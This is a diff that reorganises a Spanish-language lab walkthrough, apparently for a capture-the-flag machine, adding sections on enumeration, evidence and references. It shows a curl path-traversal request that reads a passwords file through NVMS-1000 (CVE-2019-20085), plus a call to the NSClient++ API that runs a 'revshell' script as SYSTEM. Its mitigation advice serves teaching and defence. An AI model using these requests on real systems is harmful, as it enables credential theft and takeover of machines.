@@ -32,7 +32,11 @@ nmap -Pn -sCV -p 21,22,80,135,139,445,5666,6690,8443,49664 <TARGET_IP>
 | 445/tcp | SMB |
 | 8443/tcp | NSClient++ (solo local) |
 
-## Foothold: path traversal
+## Enumeración
+
+- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+
+## Foothold
 
 ```bash
 curl --path-as-is 'http://<TARGET_IP>/../../../../../../Users/Nadine/Desktop/Passwords.txt'
@@ -46,7 +50,12 @@ ssh nadine@<TARGET_IP>
 type C:\Users\Nadine\Desktop\user.txt
 ```
 
-## Escalada: NSClient++
+## Movimiento lateral
+
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+
+## Escalada de privilegios
 
 Con el puerto cerrado al exterior, túnel:
 
@@ -69,7 +78,12 @@ curl -k -u 'admin:<password>' 'https://127.0.0.1:8443/api/v1/queries/revshell/co
 
 El proceso corre como `SYSTEM` porque el servicio NSClient++ lo hace.
 
-## Errores típicos
+## Evidencia
+
+- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
+- Los valores reales viven en `private/` y no se publican.
+
+## Lecciones aprendidas
 
 - **El traversal devuelve 404** → usa `--path-as-is` y ajusta el número de `../`; NVMS normaliza rutas.
 - **SSH rechaza la contraseña** → `Nadine` puede tener otra cuenta; revisa el fichero de passwords completo.
@@ -77,7 +91,7 @@ El proceso corre como `SYSTEM` porque el servicio NSClient++ lo hace.
 - **La API da 403** → `allowed hosts` no incluye tu IP; el túnel SSH hace que la petición llegue desde localhost.
 - **El script no aparece** → hay que recargar la configuración (`/api/v1/settings/...` o reiniciar el servicio).
 
-## Detección y mitigación
+## Mitigaciones y detección
 
 - NVMS-1000: parchear (CVE-2019-20085) y no exponerlo a Internet.
 - NSClient++: contraseña fuerte, `allowed hosts` explícito y sin scripts externos innecesarios.
@@ -85,3 +99,11 @@ El proceso corre como `SYSTEM` porque el servicio NSClient++ lo hace.
 - Auditar túneles SSH hacia puertos de administración y el uso de `curl --path-as-is` en logs.
 
 MITRE: T1190, T1059.001, T1572.
+
+## Referencias
+
+- [CVE-2019-20085](https://nvd.nist.gov/vuln/detail/CVE-2019-20085)
+- [MITRE T1059.001](https://attack.mitre.org/techniques/T1059/)
+- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
+- [MITRE T1572](https://attack.mitre.org/techniques/T1572/)
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
